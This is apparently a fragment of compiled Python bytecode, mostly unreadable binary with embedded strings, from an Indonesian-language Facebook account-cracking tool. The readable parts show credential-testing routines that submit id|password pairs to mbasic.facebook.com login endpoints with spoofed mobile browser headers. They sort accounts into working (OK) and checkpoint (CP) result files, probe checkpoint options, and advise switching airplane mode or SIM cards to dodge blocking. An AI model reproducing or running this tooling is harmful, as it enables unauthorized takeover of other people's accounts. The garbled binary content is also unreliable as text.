�1d;t|&��v �r|dV7 }dW|&v �r�|dX7 }n2|dY7 }t�1dZt|&��}(t�1d[t|&��})|(D ]}*|$d7 }$|d\|$� d]|*� d|)|% � d#�7 }|%d7 }%�q�d^|'v �r�|d_7 }n8dR\}$}%|d`7 }t�1dZt|'��}+t�1d[t|'��},|+D ]}*|$d7 }$|d\|$� d]|*� d|,|% � d#�7 }|%d7 }%�q�n	 td#� d2| � d3|� d4|� d#|� �}t(|d5d'�}t)t(|d6d)�� W  nnW q@W q@ tj3j4�yK   t�5da� Y q@w td7 ad S )bNr(   r  z9%s+> [ Prosesing ]i %s/%s <-> OK:%s <-> CP:%s <-> %s%s%sr+   r  r  rY   r  r  r  r  r  r  r  r  r  r  z)https://mbasic.facebook.com/login/?email=r,  r   r-  zname="m_ts" value="(.*?)"zname="li" value="(.*?)")r.  r/  Zm_tsr�   r�  r0  r2  r3  r4  )r   r6  r!  r�   r7  r"  r#  r%  r&  r'  r(  r)  r*  r+  zVhttps://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecatedFr8  r:  r�   r�   rh   u   [•] ID : r<  rt   rr   r�   ru   r�   r=  r>  r�   r?  c                 S   r@  rA  r   rB  r   r   r   rF  u  rG  zcrack3.<locals>.<listcomp>r�   r;  rH  rI  r�   r�   c                 S   r@  rA  r   rB  r   r   r   rF    rG  r�   rJ  r�   rK  r   rL  rM  rN  rO  rP  rQ  rR  rS  rT  rU  rV  rW  rX  rY  rZ  r[  r\  r]  r^  r_  r`  ra  rb  rc  rd  re  rf  rg  rh  ri  rj  rk  r�   rl  rm  rn  ro  )6r�   r%   rp  rq  r~   r{   rz   r}   rr  r�   r�   r   rs  rt  r�   r   r�   r   ri   rk   ru  rv  r   r�   r   r�   r�   r   r   r�   r�   r�   rx  r�   ry  rz  r�   r�   rV   r{  r   r�   rS   r  rj   r�   r   r|  r  r}  r�   r�   r�   r   )-r  r  r~  r  r�  r�  r�  r�  r�  r�  r|   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�  r�  r�  r�  r�  r�  r   r   r   r  >  s   6


(�� 

(

("�4

 

 ��C�D�r  c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }z�|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ]}
|
�d�|	v rT|�|
�d�|
�d�i� q>t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%kr�t	d&ttf � W d S |D ]}t	d't|jtf � q�W d S  ty� } z-t	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~d S d }~ww ))N�xMozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36r  r2  rY   r3  r4  �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r  r  �navigate�?1r  �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7r5  �%https://mbasic.facebook.com/login.phpr
  �r�  r0  ro   T�r�   r�   r9  �html.parser�form�Znhr/  Zfb_dtsgzsubmit[Continue]Zcheckpoint_datar�   r   rE  �action�r�   r�   �%s++++ %s|%s ----> CP       %sr�   r=  r�   rh   r   �optionr   �=   %s---> 🎉 Hore Akunya Tap Yes (Cek Login Di Lite/Mbasic%s)�%s---> %s%suC   %s---> 😱 Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)r   r�   r   �soprx  r   �findr�   r   r   r{   r�   rS   r  rj   rt  �find_allr�   r}   r~   r�   rp  )r  r�  r�  r�   r�  �hi�ho�jor�   �lion�anj�kent�opsi�opsii�cr   r   r   r{  �  s<   $
"
�$ 
� ��r{  c                  C   s$  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]Q}�z/z|�
d�d
 |�
d�d }}W n  tyd   t�d� tdt|tf � tdttf � Y W q.w t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r=zi|�!d*�}i }g d+�}|d,�D ]}|�d-�|v r�|�"|�d-�|�d.�i� q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�rtd3ttf � n|D ]}td4t|jtf � �qW n6   td1t||tf � td5ttf � Y nd6|	j�� � � v �rRtd7t||tf � n
td8t||tf � |d7 }W q. tj%j&�y�   td9� d:}t� �t	|d;d	�� t'�  Y q.w d<}t� �t	|dd	�� t'�  d S )=NzWTerdapat %s Akun Untuk Dicek
Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIru   r�   r�   z] Mulaiz# PROSES CEK OPSI DIMULAIr�   rr   r   r�   r   r�   z%s++++ %s ----> Error      %sz2%s---> Pemisah Tidak Didukung Untuk Program Ini%sz%s---> %s/%s ---> { %s }%sr+   r  r�  r  r2  rY   r3  r4  r�  r  r  r�  r�  r  r�  r�  r�  r5  r�  r
  r�  Tr�  r�  r:  r�  r�  r�   r   rE  r�  r�  r�  r�  r�  r�  u(   %s---> 😱 Tidak Dapat Mengecek Opsi%sr>  z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> SALAH       %sr�   r�   rt   z# DONE)(r�   r�   r�   r   r�   r�   rz   rx   r   rw   r  �
IndexErrorr   r   r{   rp  r�   r%   rq  r~   r}   r   ri   rk   r   r�   r   r�  rx  r   r�   ry  rz  r�  r�   r   r�  r�   r�   r   )r�  r   r�   ZloveZkesr   r�  r~  r�  r�  �headerr�  r�  r�  r�   r�  r�  r�  r�  r�  r�   Zdahr   r   r   r�   �  sr   
"
�($
"
�$
�
�
r�   r   r�   r�   )�r   r	   r�   Zbs4r   r�   r   r�   r   �
subprocess�	threading�	itertools�base64Zconcurrent.futuresr   ZAzimVaur   r   �now�ct�monthrl   Zbulanr   ZnTempr�   Zlib2to3.pgen2r   Zrich�ImportErrorr   r   Z
rich.tabler   �meZrich.consoler    rx   r�  r  r!   ZgpZ
rich.panelr"   r   r   r�   Zrich.markdownr#   rw   Zrich.columnsr$   �colr%   ry   rv  ru  r   r   rw  rS   rj   r�   r�   r�   Zxdr=  �	randranger{   r�  �dr�   �grz   �i�jrq  ZuakurV   Zaa�lZuaku2r   r�   rr  rs  rt  r�   r�   r�   r�   r�   r�   Zlisensikunir�   rU   ZpwplussZpwnyarX   r�   r}   rp  r~   r|   ZdicZdic2�dayZtglr   Zbln�yearZthnr  r  �dtr�   r�  ZprincpZIPZCNr�   rm   rn   rp   r�   ro   rW   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r  r  r  r{  r�   �__name__�mkdirr   r   r   r   �<module>   s  h 
�H

�����<
B4
((�%sA0=w! 
9
�